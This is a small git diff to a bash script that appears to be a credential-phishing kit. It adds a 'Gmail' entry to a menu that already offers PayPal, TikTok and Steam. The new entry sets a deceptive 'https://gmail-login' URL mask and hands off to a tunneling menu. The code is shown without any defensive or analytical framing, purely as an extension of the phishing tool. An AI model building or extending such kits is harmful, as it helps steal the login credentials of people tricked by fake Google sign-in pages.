@@ -312,6 +312,7 @@ main_menu() {
 		${RED}[${WHITE}06${RED}]${CYAN} PayPal
 		${RED}[${WHITE}07${RED}]${CYAN} TikTok
 		${RED}[${WHITE}08${RED}]${CYAN} Steam
+		${RED}[${WHITE}09${RED}]${CYAN} Gmail
 		
 		${RED}[${WHITE}99${RED}]${CYAN} About
 		${RED}[${WHITE}00${RED}]${CYAN} Exit
@@ -344,6 +345,10 @@ main_menu() {
 	elif [[ "$REPLY" == 8 || "$REPLY" == 08 ]]; then
 		website="steam"
 		mask='https://steam-login'
+		tunnel_menu
+	elif [[ "$REPLY" == 9 || "$REPLY" == 09 ]]; then
+		website="gmail"
+		mask='https://gmail-login'
 		tunnel_menu
 	elif [[ "$REPLY" == 99 ]]; then
 		about
